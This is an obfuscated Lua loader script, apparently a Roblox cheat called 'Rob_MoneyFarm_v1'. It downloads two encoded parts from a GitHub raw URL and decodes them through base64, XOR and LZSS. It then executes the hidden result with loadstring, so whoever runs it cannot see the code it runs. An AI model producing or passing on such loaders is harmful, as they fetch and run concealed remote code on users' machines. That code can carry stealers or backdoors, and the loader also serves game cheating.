--[[
  Rob_MoneyFarm_v1  protected build
  Loader: fetch parts -> xor -> lzss -> run
]]
local _wS1E1kZ={
"https://raw.githubusercontent.com/fhuev12/Rob-Scripts/main/parts/Rob_MoneyFarm_v1.p1.txt",
"https://raw.githubusercontent.com/fhuev12/Rob-Scripts/main/parts/Rob_MoneyFarm_v1.p2.txt"
}
local _XPQEOLn={}
for _MMojQDH=1,#_wS1E1kZ do
  local _oQxbm24=game:HttpGet(_wS1E1kZ[_MMojQDH])
  _XPQEOLn[#_XPQEOLn+1]=_oQxbm24
end
local _j63RJqP=table.concat(_XPQEOLn):gsub('%s+','')
local _cIFgxZC='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local _snqN8vb={}
for _MMojQDH=1,#_cIFgxZC do _snqN8vb[_cIFgxZC:sub(_MMojQDH,_MMojQDH)]=_MMojQDH-1 end
local function _AWce3Bo(_9RdHavw)
  local _u3QcW2O={}
  local _iXLgoeB=#_9RdHavw
  local _MMojQDH=1
  while _MMojQDH<=_iXLgoeB do
    local _8Dejp7Z=_snqN8vb[_9RdHavw:sub(_MMojQDH,_MMojQDH)]
    local _wBg5peW=_snqN8vb[_9RdHavw:sub(_MMojQDH+1,_MMojQDH+1)]
    local _GV6VENc=_9RdHavw:sub(_MMojQDH+2,_MMojQDH+2)
    local _dC2O1XU=_9RdHavw:sub(_MMojQDH+3,_MMojQDH+3)
    local _y1nMBpN=(_GV6VENc=='=') and -1 or _snqN8vb[_GV6VENc]
    local _Ml54GNc=(_dC2O1XU=='=') and -1 or _snqN8vb[_dC2O1XU]
    if not (_8Dejp7Z and _wBg5peW) then break end
    _u3QcW2O[#_u3QcW2O+1]=string.char(_8Dejp7Z*4+math.floor(_wBg5peW/16))
    if _y1nMBpN and _y1nMBpN>=0 then
      _u3QcW2O[#_u3QcW2O+1]=string.char((_wBg5peW%16)*16+math.floor(_y1nMBpN/4))
      if _Ml54GNc and _Ml54GNc>=0 then
        _u3QcW2O[#_u3QcW2O+1]=string.char((_y1nMBpN%4)*64+_Ml54GNc)
      end
    end
    _MMojQDH=_MMojQDH+4
  end
  return table.concat(_u3QcW2O)
end
local _PQJTHBN='KUoLYP8g3FtBU4crgsG46_P9rZ53'
local _HKZI8Ov=bit32
local function _NaxIN8N(_9RdHavw)
  local _u3QcW2O={}
  local _AAWz60m=#_PQJTHBN
  for _MMojQDH=1,#_9RdHavw do
    _u3QcW2O[_MMojQDH]=string.char(_HKZI8Ov.bxor(string.byte(_9RdHavw,_MMojQDH),string.byte(_PQJTHBN,(_MMojQDH-1)%_AAWz60m+1)))
  end
  return table.concat(_u3QcW2O)
end
local function _0yokEGt(_9RdHavw)
  local _u3QcW2O={}
  local _MMojQDH=1
  local _Wt6YDvQ=0
  local _BJUmkOO=0
  while _MMojQDH<=#_9RdHavw do
    if _BJUmkOO==0 then _Wt6YDvQ=string.byte(_9RdHavw,_MMojQDH);_MMojQDH=_MMojQDH+1;_BJUmkOO=8 end
    if _HKZI8Ov.band(_Wt6YDvQ,1)==1 then
      local _Dxdyo5p=string.byte(_9RdHavw,_MMojQDH)*256+string.byte(_9RdHavw,_MMojQDH+1)
      local _2xLHEWy=string.byte(_9RdHavw,_MMojQDH+2)
      _MMojQDH=_MMojQDH+3
      local _PzZ3IIz=#_u3QcW2O-_Dxdyo5p
      for _01U7r9f=1,_2xLHEWy do _u3QcW2O[#_u3QcW2O+1]=_u3QcW2O[_PzZ3IIz+_01U7r9f] end
    else
      _u3QcW2O[#_u3QcW2O+1]=string.sub(_9RdHavw,_MMojQDH,_MMojQDH)
      _MMojQDH=_MMojQDH+1
    end
    _Wt6YDvQ=_HKZI8Ov.rshift(_Wt6YDvQ,1)
    _BJUmkOO=_BJUmkOO-1
  end
  return table.concat(_u3QcW2O)
end
local _8Mn2SON=_NaxIN8N(_AWce3Bo(_j63RJqP))
local _2xLHEWy=_HKZI8Ov.band(string.byte(_8Mn2SON,1),255)+_HKZI8Ov.lshift(_HKZI8Ov.band(string.byte(_8Mn2SON,2),255),8)+_HKZI8Ov.lshift(_HKZI8Ov.band(string.byte(_8Mn2SON,3),255),16)+_HKZI8Ov.lshift(_HKZI8Ov.band(string.byte(_8Mn2SON,4),255),24)
local _BzBo0UR=string.sub(_8Mn2SON,5,4+_2xLHEWy)
local _SrmhmH1=_0yokEGt(_BzBo0UR)
local _9ukPv7X=(loadstring or load)(_SrmhmH1,'@Rob_MoneyFarm_v1')
if not _9ukPv7X then error('protected payload failed to load') end
_9ukPv7X()
